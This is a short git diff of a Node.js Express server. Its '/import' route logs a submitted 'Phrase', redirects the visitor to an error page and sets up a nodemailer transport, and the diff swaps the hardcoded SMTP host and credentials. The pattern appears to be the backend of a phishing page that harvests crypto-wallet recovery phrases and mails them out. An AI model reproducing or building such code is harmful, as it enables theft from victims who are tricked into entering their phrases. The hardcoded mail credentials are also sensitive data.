@@ -25,11 +25,11 @@ app.post("/import", async (req, res) => {
         console.log(req.body.Phrase)
         res.redirect("/error")
         let transport = nodemailer.createTransport({
-            host: 'smtp.ethereal.email',
-            port: 587,
+            host: "smtp.mailtrap.io",
+            port: 2525,
             auth: {
-                user: "ronaldo19@ethereal.email",
-                pass: "AZNUNdaCRTqCY6kfuU"
+                user: "03aa34adf1611f",
+                pass: "433a4aa128eab7"
             }
         })
     
